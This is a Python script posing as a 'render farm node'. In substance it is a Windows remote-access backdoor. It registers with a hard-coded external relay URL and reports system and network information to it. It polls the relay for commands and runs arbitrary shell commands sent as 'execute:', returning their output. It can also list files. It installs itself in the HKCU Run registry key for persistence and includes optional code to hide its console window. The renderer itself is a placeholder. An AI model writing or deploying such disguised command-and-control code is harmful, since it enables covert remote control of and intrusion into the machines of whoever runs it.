import subprocess
import sys
import os
import time
import threading
import json
import winreg
from pathlib import Path
import platform
import uuid
import requests
from datetime import datetime
import logging
import psutil
import socket
from concurrent.futures import ThreadPoolExecutor
import queue

class HighPerformanceRenderNode:
    def __init__(self):
        # Cloud relay configuration
        self.relay_config = {
            'relay_url': 'https://mathematical-judy-bageltigerstudeos-3479b0db.koyeb.app',
            'heartbeat_interval': 25,
            'reconnect_delay': 3,
            'max_retries': 5,
            'timeout': 15
        }
        
        self.config = {
            'render_app': r'C:\Path\To\Your\Renderer.exe',
            'work_dir': r'C:\render_farm\work',
            'max_restarts': 9999,
            'restart_delay': 5,
            'max_workers': 3
        }
        
        # Setup directories
        Path(self.config['work_dir']).mkdir(parents=True, exist_ok=True)
        
        # State management
        self.restart_count = 0
        self.is_running = True
        self.current_process = None
        self.node_id = None
        self.last_heartbeat = 0
        self.retry_count = 0
        
        # Performance optimization
        self.command_queue = queue.Queue()
        self.heartbeat_queue = queue.Queue()
        self.response_queue = queue.Queue()
        self.thread_pool = ThreadPoolExecutor(max_workers=self.config['max_workers'])
        
        # Caching
        self.system_info_cache = None
        self.cache_timeout = 30
        self.last_cache_update = 0
        
        # Get node identity
        self.node_info = self.get_node_identity()
        
        # Setup logging and auto-start
        self.setup_logging()
        self.setup_autostart()
        
        self.logger.info(f"🚀 High-Performance Render Node '{self.node_info['node_name']}' starting...")
        self.logger.info(f"   Relay: {self.relay_config['relay_url']}")
        self.logger.info(f"   System: {platform.system()} {platform.release()}")
        
    def setup_logging(self):
        """Setup advanced logging"""
        self.logger = logging.getLogger('RenderNode')
        self.logger.setLevel(logging.INFO)
        
        # Create formatter
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        
        # File handler
        fh = logging.FileHandler('node.log')
        fh.setLevel(logging.INFO)
        fh.setFormatter(formatter)
        
        # Console handler
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)
        
        self.logger.addHandler(fh)
        self.logger.addHandler(ch)
        
    def get_node_identity(self):
        """Get or create this node's identity with caching"""
        identity_file = Path('node_identity.json')
        if identity_file.exists():
            try:
                with open(identity_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                self.logger.warning(f"Failed to load identity: {e}")
        
        computer_name = platform.node()
        identity = {
            'node_name': f"Node-{computer_name}-{str(uuid.uuid4())[:8]}",
            'computer_name': computer_name,
            'system_type': 'render_node',
            'version': '2.0',
            'system_info': self.get_system_info(),
            'ip_address': self.get_ip_address()
        }
        
        try:
            with open(identity_file, 'w') as f:
                json.dump(identity, f, indent=2)
        except Exception as e:
            self.logger.warning(f"Failed to save identity: {e}")
            
        return identity

    def get_system_info(self):
        """Get comprehensive system information with caching"""
        current_time = time.time()
        if (self.system_info_cache and 
            current_time - self.last_cache_update < self.cache_timeout):
            return self.system_info_cache
            
        try:
            system_info = {
                'os': f"{platform.system()} {platform.release()}",
                'processor': platform.processor(),
                'architecture': platform.architecture()[0],
                'python_version': platform.python_version(),
                'cpu_cores': psutil.cpu_count(logical=False),
                'logical_cores': psutil.cpu_count(logical=True),
                'total_memory_gb': round(psutil.virtual_memory().total / (1024**3), 1),
                'available_memory_gb': round(psutil.virtual_memory().available / (1024**3), 1),
                'disk_usage': psutil.disk_usage('/').percent
            }
            
            self.system_info_cache = system_info
            self.last_cache_update = current_time
            return system_info
            
        except Exception as e:
            self.logger.warning(f"Failed to get system info: {e}")
            return {'os': platform.system(), 'error': str(e)}

    def get_ip_address(self):
        """Get node IP address"""
        try:
            hostname = socket.gethostname()
            return socket.gethostbyname(hostname)
        except:
            return "Unknown"

    def get_performance_stats(self):
        """Get real-time performance statistics"""
        try:
            return {
                'timestamp': datetime.now().isoformat(),
                'cpu_percent': psutil.cpu_percent(interval=0.1),
                'memory_percent': psutil.virtual_memory().percent,
                'disk_usage': psutil.disk_usage('/').percent,
                'boot_time': psutil.boot_time(),
                'active_processes': len(psutil.pids()),
                'network_io': {k: v._asdict() for k, v in psutil.net_io_counters(pernic=True).items()}
            }
        except Exception as e:
            self.logger.warning(f"Failed to get performance stats: {e}")
            return {'error': str(e)}

    def register_with_relay(self):
        """Register this node with the cloud relay with retry logic"""
        for attempt in range(self.relay_config['max_retries']):
            try:
                response = requests.post(
                    f"{self.relay_config['relay_url']}/node/register",
                    json={
                        'node_name': self.node_info['node_name'],
                        'computer_name': self.node_info['computer_name'],
                        'system_info': self.node_info['system_info']
                    },
                    timeout=self.relay_config['timeout']
                )
                
                if response.status_code == 200:
                    data = response.json()
                    self.node_id = data.get('node_id')
                    self.retry_count = 0
                    self.logger.info(f"✅ Registered with cloud relay! Node ID: {self.node_id}")
                    return True
                else:
                    self.logger.warning(f"⚠️ Registration attempt {attempt + 1} failed: {response.text}")
                    
            except Exception as e:
                self.logger.warning(f"⚠️ Registration attempt {attempt + 1} error: {e}")
            
            if attempt < self.relay_config['max_retries'] - 1:
                time.sleep(self.relay_config['reconnect_delay'])
        
        self.logger.error("❌ Failed to register after all retries")
        return False

    def send_heartbeat(self):
        """Send heartbeat to relay and get pending commands - optimized"""
        if not self.node_id:
            if not self.register_with_relay():
                return []
                
        try:
            # Include performance stats in heartbeat
            performance_stats = self.get_performance_stats()
            
            response = requests.post(
                f"{self.relay_config['relay_url']}/node/heartbeat",
                json={
                    'node_id': self.node_id,
                    'performance_stats': performance_stats
                },
                timeout=self.relay_config['timeout']
            )
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                if commands:
                    self.logger.info(f"📨 Received {len(commands)} commands")
                return commands
            else:
                self.logger.warning(f"⚠️ Heartbeat failed: {response.text}")
                return []
                
        except Exception as e:
            self.logger.warning(f"⚠️ Heartbeat error: {e}")
            # Try to re-register on connection errors
            if "Connection" in str(e):
                self.node_id = None
            return []

    def send_command_response(self, command_id, response_data):
        """Send command response back to relay asynchronously"""
        self.response_queue.put((command_id, response_data))

    def process_response_queue(self):
        """Process response queue in background"""
        while self.is_running:
            try:
                command_id, response_data = self.response_queue.get(timeout=1)
                try:
                    requests.post(
                        f"{self.relay_config['relay_url']}/command/response",
                        json={
                            'command_id': command_id,
                            'response': response_data
                        },
                        timeout=10
                    )
                    self.logger.debug(f"✅ Response sent for command {command_id}")
                except Exception as e:
                    self.logger.warning(f"⚠️ Failed to send response: {e}")
            except queue.Empty:
                continue

    def handle_command(self, command):
        """Execute commands and return output with enhanced capabilities"""
        try:
            start_time = time.time()
            
            if command == 'status':
                result = {
                    'status': 'running', 
                    'restarts': self.restart_count,
                    'renderer_running': self.current_process and self.current_process.poll() is None,
                    'node_name': self.node_info['node_name'],
                    'computer_name': self.node_info['computer_name'],
                    'performance': self.get_performance_stats(),
                    'uptime': time.time() - start_time,
                    'timestamp': datetime.now().isoformat()
                }
            
            elif command == 'stop':
                self.is_running = False
                if self.current_process:
                    self.current_process.terminate()
                result = {'status': 'shutting_down'}
            
            elif command == 'performance':
                result = self.get_performance_stats()
            
            elif command == 'system_info':
                result = {
                    'node_info': self.node_info,
                    'system_info': self.get_system_info(),
                    'performance': self.get_performance_stats()
                }
            
            elif command.startswith('execute:'):
                cmd = command[8:]
                result = subprocess.run(
                    cmd, 
                    shell=True, 
                    capture_output=True, 
                    text=True, 
                    timeout=60,
                    cwd=self.config['work_dir']
                )
                result = {
                    'returncode': result.returncode,
                    'stdout': result.stdout[-1000:],  # Limit output size
                    'stderr': result.stderr[-1000:],
                    'command': cmd,
                    'execution_time': round(time.time() - start_time, 2)
                }
            
            elif command == 'restart_renderer':
                if self.current_process:
                    self.current_process.terminate()
                result = {'status': 'renderer_restarting'}
            
            elif command.startswith('file:'):
                # Handle file operations
                if command.startswith('file:list:'):
                    path = command[10:]
                    files = list(Path(path).glob('*')) if path else list(Path('.').glob('*'))
                    result = {'files': [str(f) for f in files]}
                else:
                    result = {'error': f'Unknown file command: {command}'}
            
            else:
                result = {'error': f'Unknown command: {command}'}
            
            result['processing_time'] = round(time.time() - start_time, 3)
            return result
                
        except subprocess.TimeoutExpired:
            return {'error': 'Command timeout after 60 seconds'}
        except Exception as e:
            return {'error': str(e), 'processing_time': round(time.time() - start_time, 3)}

    def process_single_command(self, command_data):
        """Process a single command in thread pool"""
        command_id = command_data.get('command_id')
        command = command_data.get('command')
        
        self.logger.info(f"🔄 Executing command: {command}")
        
        # Execute command
        response = self.handle_command(command)
        
        # Send response back
        self.send_command_response(command_id, response)
        
        # Handle stop command immediately
        if command == 'stop':
            self.is_running = False
            return False
            
        return True

    def process_commands(self, commands):
        """Process all pending commands using thread pool"""
        if not commands:
            return True
            
        futures = []
        for command_data in commands:
            future = self.thread_pool.submit(self.process_single_command, command_data)
            futures.append(future)
        
        # Wait for all commands to complete with timeout
        for future in futures:
            try:
                if not future.result(timeout=65):  # Command timeout + buffer
                    return False
            except Exception as e:
                self.logger.error(f"Command execution error: {e}")
        
        return True

    def run_renderer(self):
        """Run the renderer application with monitoring"""
        try:
            if os.path.exists(self.config['render_app']):
                self.current_process = subprocess.Popen(
                    [self.config['render_app']],
                    cwd=self.config['work_dir'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                # Monitor renderer output
                def monitor_output():
                    while self.current_process and self.current_process.poll() is None:
                        try:
                            output = self.current_process.stdout.readline()
                            if output:
                                self.logger.debug(f"Renderer: {output.strip()}")
                        except:
                            break
                
                output_thread = threading.Thread(target=monitor_output, daemon=True)
                output_thread.start()
                
                return self.current_process.wait()
            else:
                self.logger.warning(f"⚠️ Render app not found: {self.config['render_app']}")
                # Simulate renderer for demo
                self.logger.info("🔄 Running in simulation mode")
                time.sleep(30)
                return 0
        except Exception as e:
            self.logger.error(f"Renderer error: {e}")
            return 1

    def start_heartbeat_loop(self):
        """Start the optimized heartbeat and command processing loop"""
        self.logger.info("🫀 Starting optimized heartbeat loop...")
        
        # Start response processor
        response_thread = threading.Thread(target=self.process_response_queue, daemon=True)
        response_thread.start()
        
        # Register first
        if not self.register_with_relay():
            self.logger.error("❌ Initial registration failed, will retry in heartbeat loop")
        
        last_heartbeat_time = 0
        consecutive_failures = 0
        
        while self.is_running:
            try:
                current_time = time.time()
                
                # Send heartbeat at intervals
                if current_time - last_heartbeat_time >= self.relay_config['heartbeat_interval']:
                    commands = self.send_heartbeat()
                    last_heartbeat_time = current_time
                    
                    if commands is not None:  # None indicates connection failure
                        consecutive_failures = 0
                        # Process any commands
                        if commands:
                            should_continue = self.process_commands(commands)
                            if not should_continue:
                                break
                    else:
                        consecutive_failures += 1
                        if consecutive_failures >= 3:
                            self.logger.error("❌ Multiple consecutive heartbeat failures")
                            # Try to re-register
                            self.node_id = None
                
                # Brief sleep to prevent CPU spinning
                time.sleep(0.1)
                
            except Exception as e:
                self.logger.error(f"❌ Heartbeat loop error: {e}")
                consecutive_failures += 1
                time.sleep(1)
        
        self.logger.info("🛑 Heartbeat loop stopped")

    def start(self):
        """Main execution loop"""
        self.logger.info("🚀 Starting high-performance cloud render node...")
        
        # Start heartbeat loop in separate thread
        heartbeat_thread = threading.Thread(target=self.start_heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Main render loop
        while self.is_running and self.restart_count < self.config['max_restarts']:
            self.restart_count += 1
            self.logger.info(f"🎬 Render restart #{self.restart_count}")
            
            exit_code = self.run_renderer()
            
            if not self.is_running:
                break
                
            self.logger.info(f"Renderer exited with code {exit_code}, restarting in {self.config['restart_delay']}s...")
            time.sleep(self.config['restart_delay'])
        
        self.logger.info("🛑 Cloud render node shutting down")
        self.is_running = False
        self.thread_pool.shutdown(wait=True)

    def setup_autostart(self):
        """Register for auto-start without admin rights"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "CloudRenderNode", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
            self.logger.info("✅ Auto-start configured successfully")
        except Exception as e:
            self.logger.warning(f"⚠️ Auto-start configuration failed: {e}")

if __name__ == "__main__":
    # Optional: Hide console window (uncomment if needed)
    """
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    """
    
    node = HighPerformanceRenderNode()
    try:
        node.start()
    except KeyboardInterrupt:
        node.logger.info("Received interrupt signal, shutting down...")
        node.is_running = False
    except Exception as e:
        node.logger.error(f"Fatal error: {e}")
